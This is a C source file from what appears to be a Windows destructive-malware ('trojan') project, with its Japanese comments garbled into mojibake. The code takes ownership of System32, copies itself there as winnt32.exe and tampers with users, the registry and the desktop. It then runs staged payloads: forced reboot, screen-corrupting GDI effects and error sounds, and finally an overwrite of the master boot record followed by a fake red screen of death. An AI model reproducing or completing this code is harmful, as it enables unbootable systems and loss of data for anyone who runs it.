#include "001.h"

void All_Setup ( )
{
	//���s�t�@�C���p�X
	WCHAR ExePath[ MAX_PATH ];
	GetModuleFileNameW ( NULL, ExePath, sizeof ( ExePath ) / sizeof ( *ExePath ) );

	//�t�@�C���̏��L�Ҍ����擾
	TakeOwn ( L"C:\\Windows\\System32" );

	//System32�Ɏ��g�̕������쐬
	_001_CopyFile ( ExePath, L"C:\\Windows\\System32\\winnt32.exe", FALSE );

	//�Z�b�g�A�b�v
	_001_StartSetup ( );
	_001_UsersSetup ( );
	_001_registrySetup ( );
	_001_WallpaperSetup ( );
	_001_DesktopFilesSetup ( );

	//���s�t���O�쐬
	CreateFlag ( L"001Flag.tmp" );
	Sleep ( 3000 );
}

void payload_start1 ( )
{
	DLLFunctionDefW ( L"user32.dll", WINAPI, BOOL, SetProcessDPIAware, ( VOID ) );

	//DPI�ݒ�
	SetProcessDPIAware ( );

	FreeLibrary ( SetProcessDPIAwareDLL );

	//�t���O�쐬
	CreateFlag ( L"001Flags2" );

	WCHAR text[ MAX_PATH ];
	GetRandomPath ( text, 30 );
	MessageBoxW ( NULL, text, NULL, MB_OK | MB_ICONWARNING );
	Poweroff ( ShutdownReboot );
}

void payload_start2 ( )
{
	DLLFunctionDefW ( L"user32.dll", WINAPI, BOOL, SetProcessDPIAware, ( VOID ) );

	//DPI�ݒ�
	SetProcessDPIAware ( );

	FreeLibrary ( SetProcessDPIAwareDLL );

	//�O�̃t���O�폜
	DeleteFlag ( L"001Flags2" );

	//�V�����t���O�̍쐬
	CreateFlag ( L"001Flags3" );

	//Sleep( 3000 );

	//�y�C���[�h���s
	CreateThread ( 0, 0, ( PTHREAD_START_ROUTINE ) _001_MoveIconsPayload, 0, 0, 0 );
	CreateThread ( 0, 0, ( PTHREAD_START_ROUTINE ) EnumGlobalWnd, 0, 0, 0 );

	Sleep ( INFINITE );
}

void payload_start3 ( )
{
	DLLFunctionDefW ( L"user32.dll", WINAPI, BOOL, SetProcessDPIAware, ( VOID ) );

	//DPI�ݒ�
	SetProcessDPIAware ( );

	FreeLibrary ( SetProcessDPIAwareDLL );

	//�O�̃t���O�폜
	DeleteFlag ( L"001Flags3" );

	//�V�����t���O�̍쐬
	CreateFlag ( L"001Flags4" );

	//Sleep( 3000 );

	//�y�C���[�h���s
	CreateThread ( 0, 0, ( PTHREAD_START_ROUTINE ) _001_gdi1, 0, 0, 0 );
	CreateThread ( 0, 0, ( PTHREAD_START_ROUTINE ) EnumGlobalWnd, 0, 0, 0 );

	Sleep ( INFINITE );
}

void payload_start4 ( )
{
	DLLFunctionDefW ( L"user32.dll", WINAPI, BOOL, SetProcessDPIAware, ( VOID ) );

	//DPI�ݒ�
	SetProcessDPIAware ( );

	FreeLibrary ( SetProcessDPIAwareDLL );

	//�O�̃t���O�폜
	DeleteFlag ( L"001Flags4" );

	//�V�����t���O�̍쐬
	CreateFlag ( L"001Flags5" );

	//Sleep( 3000 );

	//�y�C���[�h���s
	CreateThread ( 0, 0, ( PTHREAD_START_ROUTINE ) _001_ApplicationError, 0, 0, 0 );
	CreateThread ( 0, 0, ( PTHREAD_START_ROUTINE ) EnumGlobalWnd, 0, 0, 0 );

	Sleep ( INFINITE );
}

void payload_start5 ( )
{
	DLLFunctionDefW ( L"user32.dll", WINAPI, BOOL, SetProcessDPIAware, ( VOID ) );

	//DPI�ݒ�
	SetProcessDPIAware ( );

	FreeLibrary ( SetProcessDPIAwareDLL );

	//�O�̃t���O�폜
	DeleteFlag ( L"001Flags5" );

	//�V�����t���O�̍쐬
	CreateFlag ( L"001Flags6" );

	//Sleep( 3000 );

	//�y�C���[�h���s
	CreateThread ( 0, 0, ( PTHREAD_START_ROUTINE ) _001_ErrorSound1, 0, 0, 0 );
	CreateThread ( 0, 0, ( PTHREAD_START_ROUTINE ) _001_gdi2, 0, 0, 0 );
	CreateThread ( 0, 0, ( PTHREAD_START_ROUTINE ) EnumGlobalWnd, 0, 0, 0 );

	Sleep ( INFINITE );
}

void payload_start6 ( )
{
	DLLFunctionDefW ( L"user32.dll", WINAPI, BOOL, SetProcessDPIAware, ( VOID ) );

	//DPI�ݒ�
	SetProcessDPIAware ( );

	FreeLibrary ( SetProcessDPIAwareDLL );

	//�O�̃t���O�폜
	DeleteFlag ( L"001Flags6" );

	//�V�����t���O�̍쐬
	CreateFlag ( L"001Flags7" );

	//Sleep( 3000 );

	//�y�C���[�h���s
	CreateThread ( 0, 0, ( PTHREAD_START_ROUTINE ) _001_ErrorSound2, 0, 0, 0 );
	CreateThread ( 0, 0, ( PTHREAD_START_ROUTINE ) _001_gdi3, 0, 0, 0 );
	CreateThread ( 0, 0, ( PTHREAD_START_ROUTINE ) EnumGlobalWnd, 0, 0, 0 );

	Sleep ( INFINITE );
}

void payload_start7 ( )
{
	DLLFunctionDefW ( L"user32.dll", WINAPI, BOOL, SetProcessDPIAware, ( VOID ) );

	//DPI�ݒ�
	SetProcessDPIAware ( );

	FreeLibrary ( SetProcessDPIAwareDLL );

	//�O�̃t���O�폜
	DeleteFlag ( L"001Flags7" );

	//�V�����t���O�̍쐬
	CreateFlag ( L"001FlagsFINAL" );

	//Sleep( 3000 );

	//�y�C���[�h���s
	CreateThread ( 0, 0, ( PTHREAD_START_ROUTINE ) _001_ErrorSound2, 0, 0, 0 );
	CreateThread ( 0, 0, ( PTHREAD_START_ROUTINE ) _001_gdi4, 0, 0, 0 );
	CreateThread ( 0, 0, ( PTHREAD_START_ROUTINE ) EnumGlobalWnd, 0, 0, 0 );

	Sleep ( INFINITE );
}

void payload_startFINAL ( )
{
	DLLFunctionDefW ( L"user32.dll", WINAPI, BOOL, SetProcessDPIAware, ( VOID ) );

	//DPI�ݒ�
	SetProcessDPIAware ( );

	FreeLibrary ( SetProcessDPIAwareDLL );

	//�O�̃t���O�폜
	DeleteFlag ( L"001FlagsFINAL" );

	//Sleep( 3000 );

	//�y�C���[�h���s
	_001_OverwriteMBR ( );
	CreateThread ( 0, 0, ( PTHREAD_START_ROUTINE ) EnumGlobalWnd, 0, 0, 0 );
	_001_RSOD ( );

	Sleep ( INFINITE );
}